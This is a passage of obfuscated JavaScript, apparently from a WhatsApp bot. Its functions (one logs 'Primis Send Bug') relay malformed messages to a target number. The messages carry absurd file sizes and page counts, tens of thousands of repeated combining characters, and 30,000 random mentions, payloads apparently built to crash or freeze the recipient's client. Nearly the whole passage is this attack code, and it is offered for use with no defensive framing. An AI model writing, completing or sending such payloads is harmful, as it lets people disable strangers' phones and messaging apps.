            'forwardingScore': 0xa,
            'isForwarded': false,
            'quotedAd': {
              'advertiserName': " X ",
              'mediaType': 'IMAGE',
              'jpegThumbnail': fs.readFileSync("./media/prim.jpg"),
              'caption': " X "
            },
            'placeholderKey': {
              'remoteJid': "0@s.whatsapp.net",
              'fromMe': false,
              'id': 'ABCDEF1234567890'
            },
            'expiration': 0x15180,
            'ephemeralSettingTimestamp': '1728090592378',
            'ephemeralSharedSecret': "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
            'externalAdReply': {
              'title': "‎᭎ᬼᬼᬼৗীি𑍅𑍑\n⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿\n𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿",
              'body': "Rood͜͡\xA0ɪ͜͡s⃟͜͡\xA0ʜ͜͡ᴇ͜͡ʀ͜͡ᴇ͜͡",
              'mediaType': 'VIDEO',
              'renderLargerThumbnail': true,
              'previewType': "VIDEO",
              'thumbnail': "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
              'sourceType': " x ",
              'sourceId': " x ",
              'sourceUrl': 'x',
              'mediaUrl': 'x',
              'containsAutoReply': true,
              'showAdAttribution': true,
              'ctwaClid': "ctwa_clid_example",
              'ref': "ref_example"
            },
            'entryPointConversionSource': "entry_point_source_example",
            'entryPointConversionApp': 'entry_point_app_example',
            'entryPointConversionDelaySeconds': 0x5,
            'disappearingMode': {},
            'actionLink': {
              'url': "‎ ‎ "
            },
            'groupSubject': " X ",
            'parentGroupJid': "6287888888888-1234567890@g.us",
            'trustBannerType': " X ",
            'trustBannerAction': 0x1,
            'isSampled': false,
            'utm': {
              'utmSource': " X ",
              'utmCampaign': " X "
            },
            'forwardedNewsletterMessageInfo': {
              'newsletterJid': "6287888888888-1234567890@g.us",
              'serverMessageId': 0x1,
              'newsletterName': " X ",
              'contentType': "UPDATE",
              'accessibilityText': " X "
            },
            'businessMessageForwardInfo': {
              'businessOwnerJid': '0@s.whatsapp.net'
            },
            'smbClientCampaignId': "smb_client_campaign_id_example",
            'smbServerCampaignId': "smb_server_campaign_id_example",
            'dataSharingContext': {
              'showMmDisclosure': true
            }
          }
        }
      }, _0x3d25ed ? {
        'participant': {
          'jid': _0x4e0c52
        }
      } : {});
      console.log(chalk.red.bold("Primis 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠"));
    }
    ;
    async function _0x3561c4(_0x8f0179, _0x181ef8 = true) {
      const _0x95d63e = "_*~@0~*_\n".repeat(0x27d8);
      const _0x424a28 = 'ꦽ'.repeat(0x2710);
      await _0x35a9de.relayMessage(_0x8f0179, {
        'ephemeralMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'documentMessage': {
                  'url': "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  'mimetype': 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                  'fileSha256': "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  'fileLength': "9999999999999",
                  'pageCount': 0x4e729fff,
                  'mediaKey': '45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=',
                  'fileName': "⏤͟͟͞͞𝐏𝐫𝐢𝐦𝐢𝐬 𝐕5⿻",
                  'fileEncSha256': "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  'directPath': "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  'mediaKeyTimestamp': "1726867151",
                  'contactVcard': true,
                  'jpegThumbnail': 'https://files.catbox.moe/qvyfgx.jpg'
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': "⏤͟͟͞͞Primis⿻" + _0x424a28 + _0x95d63e
              },
              'contextInfo': {
                'mentionedJid': ["0@s.whatsapp.net"],
                'mentions': ['0@s.whatsapp.net']
              },
              'footer': {
                'text': ''
              },
              'nativeFlowMessage': {},
              'contextInfo': {
                'mentionedJid': ["0@s.whatsapp.net", ...Array.from({
                  'length': 0x7530
                }, () => '1' + Math.floor(Math.random() * 0x7a120) + "@s.whatsapp.net")],
                'forwardingScore': 0x1,
                'isForwarded': true,
                'fromMe': false,
                'participant': "0@s.whatsapp.net",
                'remoteJid': "status@broadcast",
                'quotedMessage': {
                  'documentMessage': {
                    'url': "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    'mimetype': 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                    'fileSha256': 'QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=',
                    'fileLength': '9999999999999',
                    'pageCount': 0x4e729fff,
                    'mediaKey': 'lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=',
                    'fileName': "⏤͟͟͞͞𝐏𝐫𝐢𝐦𝐢𝐬 𝐕5⿻",
                    'fileEncSha256': 'wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=',
                    'directPath': "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    'mediaKeyTimestamp': '1724474503',
                    'contactVcard': true,
                    'thumbnailDirectPath': '/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0',
                    'thumbnailSha256': "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    'thumbnailEncSha256': "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    'jpegThumbnail': ''
                  }
                }
              }
            }
          }
        }
      }, _0x181ef8 ? {
        'participant': {
          'jid': _0x8f0179
        }
      } : {});
    }
    async function _0x399639(_0x176d3d) {
      const _0x43a98d = {
        'groupMentionedMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'documentMessage': {
                  'url': "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                  'mimetype': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                  'fileSha256': "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                  'fileLength': '999999999999',
                  'pageCount': 0x9ff9ff9ff1ff90000000,
                  'mediaKey': '5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=',
                  'fileName': 'Undefined',
                  'fileEncSha256': "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                  'directPath': "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                  'mediaKeyTimestamp': '1715880173'
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': "\0" + "⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴